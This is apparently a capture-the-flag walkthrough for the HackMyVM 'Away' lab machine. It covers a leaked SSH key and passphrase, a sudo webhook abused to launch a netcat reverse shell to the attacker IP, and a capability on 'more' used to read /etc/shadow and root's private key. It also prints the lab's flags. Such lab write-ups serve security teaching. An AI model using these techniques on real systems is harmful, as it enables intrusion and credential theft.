+++
title = "Away - Walkthrough"
date = "2026-08-31"
author = "nvru"
description = "Walkthrough for the Away machine."
tags = [
  "ctf",
  "hackmyvm",
  "away",
  "walkthrough",
  "linux",
  "privilege-escalation",
  "ssh",
  "web-enumeration",
  "sudo",
  "linux-capabilities",
]
draft = false
+++

# Overview

- **Platform:** HackMyVM
- **Difficulty:** Medium
- **OS:** Linux
- **Attacker IP:** `10.10.10.2`
- **Target IP:** `10.10.10.8`

The objective was to enumerate the exposed services, obtain an initial foothold through exposed SSH keys, abuse a misconfigured sudo rule to compromise another user, and leverage Linux capabilities to recover the root SSH private key and gain full system access.

---

# Enumeration

## Host Discovery

```bash
netdiscover -i vboxnet0 -r 10.10.10.0/24
```

## DNS

```bash
echo "10.10.10.8 away.hmv" | sudo tee -a /etc/hosts
```

## Port Scanning

### RustScan (TCP)

```bash
rustscan -a 10.10.10.8 -- -sC -sV -A -oN nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5
80/tcp open  http    nginx 1.18.0
```

The scan identified two open services:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 8.4p1 |
| 80   | HTTP    | nginx 1.18.0  |

SSH accepted key-based authentication only.

![SSH Login](/images/hmv/away/ssh_password_disabled.png)

---

## HTTP (80)

Browsing the website revealed a user named **tula** along with an **ED25519** public key.

![Website](/images/hmv/away/http.png)

Inspecting the page source did not reveal anything interesting.

Since the page referenced an ED25519 key, I attempted to access `id_ed25519.pub`, which was publicly downloadable.

![Public Key](/images/hmv/away/public_key.png)

The public key contained the unusual comment:

```text
My passphrase is: Theclockisticking
```

This appeared to be the passphrase protecting the corresponding private key.

While enumerating further, I discovered that the private key itself was also exposed and could be downloaded.

![Private Key](/images/hmv/away/private_key.png)

---

# Initial Access

Using the downloaded private key to authenticate as `tula`, SSH prompted for the key's passphrase.

Entering:

```text
Theclockisticking
```

successfully authenticated the session.

![SSH as tula](/images/hmv/away/tula_shell.png)

---

# Privilege Escalation

## Tula → lula

Nothing interesting was found in `tula`'s home directory.

Checking the user's sudo permissions revealed that `tula` could execute `/usr/bin/webhook` as the user `lula` without supplying a password.

![Sudo Permissions](/images/hmv/away/sudo_permissions.png)

A webhook configuration was created:

```json
[
  {
    "id": "shell",
    "execute-command": "/tmp/rev",
    "command-working-directory": "/tmp"
  }
]
```

The payload simply launched a reverse shell.

```bash
#!/usr/bin/env bash

busybox nc 10.10.10.2 9001 -e /bin/bash
```

The webhook server was then started as `lula`:

```bash
sudo -u lula webhook -hooks hook.json -port 9000 -verbose
```

![Webhook](/images/hmv/away/webhook.png)

Triggering the webhook with curl executed the payload:

```bash
curl http://10.10.10.8:9000/hooks/shell
```

A reverse shell was received as `lula`.

![Shell as lula](/images/hmv/away/lula_shell.png)

---

## Stabilizing the Shell

```bash
script -q /dev/null
```

Press `Ctrl + Z` and execute:

```bash
stty raw -echo; fg
```

Press **Enter** twice to restore the terminal.

---

## Lula → root

No interesting files or sudo permissions were available for `lula`.

![Lula Enumeration](/images/hmv/away/lula_enum.png)

Checking the current groups also revealed nothing useful.

```bash
id
groups
```

![Capabilities](/images/hmv/away/groups.png)

Searching for file capabilities revealed an interesting entry:

```bash
/sbin/getcap -r / 2>/dev/null
```

`/usr/bin/more` possessed elevated capabilities that allowed it to read any file on the system.

![Capabilities](/images/hmv/away/getcap.png)

For example:

```bash
/usr/bin/more /etc/shadow
```

![Read Shadow](/images/hmv/away/read_shadow.png)

Since `tula` authenticated using an ED25519 SSH key, I checked whether root also used the same key type.

Reading the root private key was possible:

```bash
more /root/.ssh/id_ed25519
```

![Root Key](/images/hmv/away/root_key.png)

Saving the key locally and authenticating as `root` provided full administrative access.

---

# Root

![Root](/images/hmv/away/root.png)

---

# Credentials

```text
SSH Key
--------
tula
Passphrase: Theclockisticking
```

---

# Flags

## User

```text
HMVDULEMISPLCYDKEG
```

## Root

```text
HMVNYDWAPOQNDYUBNI
```

---

# Attack Path

```text
Host Discovery
    ↓
Port Scan (RustScan / Nmap)
    ↓
HTTP Enumeration
    ↓
Exposed SSH Public & Private Keys
    ↓
SSH Login as tula
    ↓
Abuse webhook via sudo (tula → lula)
    ↓
Reverse Shell as lula
    ↓
Enumerate Linux Capabilities
    ↓
Read root SSH Private Key via more Capability
    ↓
SSH Login as root
```

---

# References

- [GTFOBins – more](https://gtfobins.github.io/gtfobins/more/)
- [Webhook – Aikes Docs](https://docs.aikedejongste.nl/linux-utils/webhook.html)
